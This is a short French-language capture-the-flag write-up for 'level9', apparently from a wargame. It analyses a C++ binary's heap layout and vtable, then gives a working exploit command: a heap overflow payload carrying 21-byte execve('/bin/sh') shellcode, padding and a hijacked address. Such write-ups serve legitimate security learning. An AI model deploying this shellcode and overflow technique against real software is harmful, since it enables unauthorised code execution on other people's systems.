# level9 - C++ Buffer Overflow avec Shellcode

## Analyse du Programme

**Structure**
- Programme en C++
- Allocation dynamique avec `_Znwj` (opérateur new)
- Deux allocations de 108 bytes
- Copie de l'argument avec `memcpy`

**Caractéristiques Mémoire**
- Premier bloc à `0x804a008`
- Second bloc à `0x804a078`
- Offset de 108 bytes entre les blocs
- Vtable à `0x08048848`

## Exploitation

**Construction du Payload**
- Shellcode: 21 bytes pour `execve("/bin/sh")`
- Padding: 83 bytes
- Adresse de retour: `0x0804a00c`

**Commande d'Exploitation**
```bash
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*83 + "\x0c\xa0\x04\x08"')
```

Le payload:
1. Adresse pour écrire le shellcode
2. Shellcode de 21 bytes
3. Padding de 83 bytes
4. Adresse de retour pointant vers le shellcode

Cette exploitation permet d'exécuter le shellcode en redirigeant le flux d'exécution vers notre code malveillant dans la heap.
